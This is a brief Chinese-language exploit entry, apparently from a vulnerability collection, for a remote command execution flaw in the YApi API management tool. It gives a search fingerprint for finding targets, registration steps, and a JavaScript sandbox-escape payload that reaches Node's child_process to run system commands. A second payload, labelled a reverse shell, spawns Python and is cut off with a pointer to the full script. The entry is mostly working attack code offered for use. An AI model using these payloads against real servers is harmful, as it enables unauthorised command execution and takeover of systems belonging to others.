# Yapi存在远程命令执行漏洞

- **系统**：Yapi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="YApi"`

**请求体 / payload**
```
注册账号登录
新建项目
添加接口
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()
反弹shell
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
Poc = process.mainModule.require("child_process").spawnSync(
'python', ['-c', 'impor…（脚本共 812 字，完整版见原文）
```
- **预期**：200　|　—